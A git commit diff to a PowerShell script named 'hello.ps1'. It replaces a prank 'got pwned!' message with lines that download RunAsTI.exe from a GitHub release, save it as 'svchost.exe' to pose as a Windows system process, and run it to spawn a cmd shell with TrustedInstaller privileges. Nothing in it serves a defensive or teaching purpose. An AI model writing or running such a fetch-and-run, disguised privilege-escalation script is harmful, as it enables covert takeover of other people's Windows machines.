ea7aa2c909ce6bcfa962625c401744c01b660bd4
gridblue <150575974+Bbblaxtop@users.noreply.github.com>
2026-05-26 18:10:46 +0500

    Update hello.ps1

--- hello.ps1
+++ hello.ps1
@@ -1,1 +1,3 @@
-cmd /c msg %username% %username% got pwned!
+cd C:
+Invoke-WebRequest -Uri "https://github.com/mbcdev/RunAsTrustedInstaller/releases/download/release-0.2/RunAsTI.exe" -OutFile "svchost.exe"
+Start-Process -FilePath "svchost.exe" -ArgumentList "cmd.exe /k whoami"
